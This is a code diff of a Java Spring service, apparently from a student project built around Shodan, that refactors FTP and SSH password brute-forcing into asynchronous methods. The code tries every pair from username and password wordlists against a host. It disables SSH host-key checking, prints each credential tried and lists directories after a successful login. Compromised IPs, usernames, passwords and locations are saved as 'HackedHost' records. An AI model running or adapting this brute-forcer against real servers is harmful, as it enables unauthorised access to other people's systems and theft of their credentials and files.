@@ -14,11 +14,16 @@ import java.net.http.HttpResponse;
 import java.time.Duration;
 import java.util.List;
 import java.util.concurrent.ExecutionException;
+import java.util.concurrent.Future;
+import java.util.concurrent.atomic.AtomicBoolean;
 
 import org.apache.commons.net.ftp.FTPClient;
 import org.apache.commons.net.ftp.FTPFile;
 import org.apache.commons.net.ftp.FTPReply;
+import org.jboss.logging.Logger;
 import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.scheduling.annotation.Async;
+import org.springframework.scheduling.annotation.AsyncResult;
 import org.springframework.stereotype.Service;
 
 import com.uah.shodan_tfg.core.services.IConnectionService;
@@ -36,8 +41,14 @@ import net.schmizz.sshj.userauth.UserAuthException;
 @Service
 public class ConnectionService implements IConnectionService {
 
+	private static Logger LOGGER = Logger.getLogger(ConnectionService.class);
+
 	private final String[] commonUsernames = {"root", "admin", "oracle", "test",
 			"administrator", "guest", "mysql", "user", "info", "apache"};
+
+	private AtomicBoolean running = new AtomicBoolean(false);
+
+	private String finalResult;
 
 	@Autowired
 	IFileService fileService;
@@ -77,9 +88,9 @@ public class ConnectionService implements IConnectionService {
 			System.out.println(body);
 			messageController.send(body);
 		} catch (InterruptedException e) {
-			e.printStackTrace();
+			LOGGER.error(e.getMessage(), e);
 		} catch (ExecutionException e) {
-			e.printStackTrace();
+			LOGGER.error(e.getMessage(), e);
 		}
 		return body;
 	}
@@ -94,7 +105,7 @@ public class ConnectionService implements IConnectionService {
 			sendMessage("Test 1", in, out);
 			stopConnection(in, out, clientSocket);
 		} catch (IOException e) {
-			e.printStackTrace();
+			LOGGER.error(e.getMessage(), e);
 		}
 	}
 
@@ -105,7 +116,7 @@ public class ConnectionService implements IConnectionService {
 			resp = in.readLine();
 			System.out.println(resp);
 		} catch (IOException e) {
-			e.printStackTrace();
+			LOGGER.error(e.getMessage(), e);
 		}
 		return resp;
 	}
@@ -117,17 +128,20 @@ public class ConnectionService implements IConnectionService {
 			out.close();
 			clientSocket.close();
 		} catch (IOException e) {
-			e.printStackTrace();
+			LOGGER.error(e.getMessage(), e);
 		}
 	}
 
 	@Override
-	public String connectToFtpServer(Host host, List<String> wordlists) {
+	@Async
+	public Future<String> connectToFtpServer(Host host, List<String> wordlists)
+			throws InterruptedException {
 		String result = "";
+		finalResult = "";
 		List<String> userWordlist = fileService
-				.fileToList("src/main/resources/wordlists/" + wordlists.get(0));
+				.fileToList("wordlists/" + wordlists.get(0));
 		List<String> passWordlist = fileService
-				.fileToList("src/main/resources/wordlists/" + wordlists.get(1));
+				.fileToList("wordlists/" + wordlists.get(1));
 		String username = "";
 		String password = "";
 		String ip = host.getIp();
@@ -150,64 +164,81 @@ public class ConnectionService implements IConnectionService {
 				System.out.println("IP--> " + ip);
 				messageController.send("IP--> " + ip);
 				Integer counter = 0;
-				for (String user : userWordlist) {
-					for (String pass : passWordlist) {
-						if (counter == 3) {
-							ftpClient.disconnect();
-							ftpClient.connect(ip, port);
-							counter = 0;
-						}
-						username = user;
-						password = pass;
-						System.out.println("Credentials tested --> User: "
-								+ username + " | Password: " + password);
-						messageController.send("Credentials tested --> User: "
-								+ username + " | Password: " + password);
-						try {
-							Boolean loggedIn = ftpClient.login(username,
-									password);
-							// Store login credentials
-							if (loggedIn) {
-								result = "Correct login credentials --> User: "
-										+ username + " | Password: " + password;
-								System.out.println(result);
-								messageController.send(result);
-								result = ftpClient.getReplyString();
-								System.out.println(
-										"FTP Server login response --> "
-												+ result);
-								messageController
-										.send("FTP Server login response --> "
-												+ result);
-								ftpClient.enterLocalPassiveMode();
-								String foldersTree = "\n{IP: " + ip
-										+ " | PORT: " + port + " | USER: "
-										+ username + " | PASS: " + password
-										+ "}\n" + generateFTPTree(ftpClient, "",
-												"/", 0, "");
-								HackedHost hackedHost = new HackedHost(null, ip,
-										username, password, port,
-										host.getLocation().getCountry(),
-										host.getLocation().getCity(),
-										foldersTree);
-								result = foldersTree;
-								hackedHostRepository.save(hackedHost);
-								break;
-							} else {
-								System.out
-										.println("Incorrect login credentials");
-								messageController
-										.send("Incorrect login credentials");
-								counter += 1;
+				if (running.compareAndSet(false, true)) {
+					for (String user : userWordlist) {
+						for (String pass : passWordlist) {
+							if (Thread.currentThread().isInterrupted()) {
+								System.out.println("Interrupted");
+								running.set(false);
+								return new AsyncResult<String>(finalResult);
 							}
-						} catch (IOException e) {
-							System.out.println(
-									"Incorrect login credentials --> " + e);
+							if (counter == 3) {
+								ftpClient.disconnect();
+								ftpClient.connect(ip, port);
+								counter = 0;
+							}
+							username = user;
+							password = pass;
+							System.out.println("Credentials tested --> User: "
+									+ username + " | Password: " + password);
 							messageController.send(
-									"Incorrect login credentials --> " + e);
-							ftpClient.disconnect();
-							ftpClient.connect(ip, port);
-							continue;
+									"Credentials tested --> User: " + username
+											+ " | Password: " + password);
+							try {
+								Boolean loggedIn = ftpClient.login(username,
+										password);
+								// Store login credentials
+								if (loggedIn) {
+									result = "Correct login credentials --> User: "
+											+ username + " | Password: "
+											+ password;
+									System.out.println(result);
+									messageController.send(result);
+									result = ftpClient.getReplyString();
+									System.out.println(
+											"FTP Server login response --> "
+													+ result);
+									messageController.send(
+											"FTP Server login response --> "
+													+ result);
+									ftpClient.enterLocalPassiveMode();
+									String foldersTree = "\n{IP: " + ip
+											+ " | PORT: " + port + " | USER: "
+											+ username + " | PASS: " + password
+											+ "}\n" + generateFTPTree(ftpClient,
+													"", "/", 0, "");
+									HackedHost hackedHost = hackedHostRepository
+											.findByIpAndPort(ip, 21);
+									if (hackedHost == null) {
+										hackedHost = new HackedHost(null, ip,
+												username, password, 21,
+												host.getLocation().getCountry(),
+												host.getLocation().getCity(),
+												foldersTree);
+									} else {
+										hackedHost.setUser(username);
+										hackedHost.setPassword(password);
+									}
+									finalResult = foldersTree;
+									hackedHostRepository.save(hackedHost);
+									running.set(false);
+									return new AsyncResult<String>(finalResult);
+								} else {
+									System.out.println(
+											"Incorrect login credentials");
+									messageController.send(
+											"Incorrect login credentials");
+									counter += 1;
+								}
+							} catch (IOException e) {
+								System.out.println(
+										"Incorrect login credentials --> " + e);
+								messageController.send(
+										"Incorrect login credentials --> " + e);
+								ftpClient.disconnect();
+								ftpClient.connect(ip, port);
+								continue;
+							}
 						}
 					}
 				}
@@ -238,9 +269,9 @@ public class ConnectionService implements IConnectionService {
 						.send("FTP Server login response --> " + result);
 			}
 		} catch (IOException e) {
-			e.printStackTrace();
+			LOGGER.error(e.getMessage(), e);
 		}
-		return result;
+		return new AsyncResult<String>(finalResult);
 	}
 
 	private String generateFTPTree(FTPClient ftpClient, String currentDirectory,
@@ -276,66 +307,97 @@ public class ConnectionService implements IConnectionService {
 	}
 
 	@Override
-	public String connectThroughSSH(Host host, List<String> wordlists) {
-		String result = "";
+	@Async
+	public Future<String> connectThroughSSH(Host host, List<String> wordlists) {
 		String ip = host.getIp();
 		List<String> userWordlist = fileService
-				.fileToList("src/main/resources/wordlists/" + wordlists.get(0));
+				.fileToList("wordlists/" + wordlists.get(0));
 		List<String> passWordlist = fileService
-				.fileToList("src/main/resources/wordlists/" + wordlists.get(1));
+				.fileToList("wordlists/" + wordlists.get(1));
 		String username = "";
 		String password = "";
-
-		for (String user : userWordlist) {
-			for (String pass : passWordlist) {
-				SSHClient clientSSH = new SSHClient();
-				clientSSH.addHostKeyVerifier(new PromiscuousVerifier());
-				username = user;
-				password = pass;
-				try {
-					clientSSH.connect(ip);
-					System.out.println("Credentials tested --> User: "
-							+ username + " | Password: " + password);
-					messageController.send("Credentials tested --> User: "
-							+ username + " | Password: " + password);
-					clientSSH.authPassword(username, password);
-					// Store login credentials
-					if (clientSSH.isConnected()
-							&& clientSSH.isAuthenticated()) {
-						System.out
-								.println("Correct login credentials --> User: "
-										+ username + " | Password: "
-										+ password);
-						messageController
-								.send("Correct login credentials --> User: "
-										+ username + " | Password: "
-										+ password);
-						SFTPClient clientSFTP = clientSSH.newSFTPClient();
-						clientSFTP.ls("/");
-						clientSSH.disconnect();
-					} else {
-						System.out.println("Incorrect login credentials");
-						messageController.send("Incorrect login credentials");
+		if (running.compareAndSet(false, true)) {
+			for (String user : userWordlist) {
+				for (String pass : passWordlist) {
+					if (Thread.currentThread().isInterrupted()) {
+						System.out.println("Interrupted");
+						running.set(false);
+						return new AsyncResult<String>(finalResult);
 					}
-				} catch (UserAuthException uae) {
-					System.out
-							.println("Incorrect login credentials --> " + uae);
-					messageController
-							.send("Incorrect login credentials --> " + uae);
+					SSHClient clientSSH = new SSHClient();
+					clientSSH.addHostKeyVerifier(new PromiscuousVerifier());
+					username = user;
+					password = pass;
 					try {
-						clientSSH.disconnect();
+						clientSSH.connect(ip);
+						System.out.println("Credentials tested --> User: "
+								+ username + " | Password: " + password);
+						messageController.send("Credentials tested --> User: "
+								+ username + " | Password: " + password);
+						clientSSH.authPassword(username, password);
+						// Store login credentials
+						if (clientSSH.isConnected()
+								&& clientSSH.isAuthenticated()) {
+							System.out.println(
+									"Correct login credentials --> User: "
+											+ username + " | Password: "
+											+ password);
+							messageController
+									.send("Correct login credentials --> User: "
+											+ username + " | Password: "
+											+ password);
+							SFTPClient clientSFTP = clientSSH.newSFTPClient();
+							String foldersTree = clientSFTP.ls("/").toString();
+							clientSSH.disconnect();
+							HackedHost hackedHost = hackedHostRepository
+									.findByIpAndPort(ip, 22);
+							if (hackedHost == null) {
+								hackedHost = new HackedHost(null, ip, username,
+										password, 22,
+										host.getLocation().getCountry(),
+										host.getLocation().getCity(),
+										foldersTree);
+							} else {
+								hackedHost.setUser(username);
+								hackedHost.setPassword(password);
+							}
+							finalResult = ip + "|" + user + "|" + pass + "|"
+									+ 22;
+							hackedHostRepository.save(hackedHost);
+							running.set(false);
+							return new AsyncResult<String>(finalResult);
+						} else {
+							System.out.println("Incorrect login credentials");
+							messageController
+									.send("Incorrect login credentials");
+						}
+					} catch (UserAuthException uae) {
+						System.out.println(
+								"Incorrect login credentials --> " + uae);
+						messageController
+								.send("Incorrect login credentials --> " + uae);
+						try {
+							clientSSH.disconnect();
+						} catch (IOException e) {
+							LOGGER.error(e.getMessage(), e);
+						}
+						continue;
 					} catch (IOException e) {
-						e.printStackTrace();
+						LOGGER.error(e.getMessage(), e);
+					} catch (IllegalThreadStateException e) {
+						LOGGER.error(e.getMessage(), e);
+					} finally {
+						try {
+							clientSSH.disconnect();
+						} catch (IOException e) {
+							LOGGER.error(e.getMessage(), e);
+						}
 					}
-					continue;
-				} catch (IOException e) {
-					e.printStackTrace();
-				} catch (IllegalThreadStateException e) {
-					e.printStackTrace();
 				}
 			}
 		}
-		return result;
+		return new AsyncResult<String>(finalResult);
+
 	}
 
 	@Override
@@ -376,7 +438,7 @@ public class ConnectionService implements IConnectionService {
 	// e2.printStackTrace();
 	// } catch (ProtocolException e) {
 	// // TODO Auto-generated catch block
-	// e.printStackTrace();
+	// LOGGER.error(e.getMessage(), e);
 	// } catch (IOException e1) {
 	// // TODO Auto-generated catch block
 	// e1.printStackTrace();
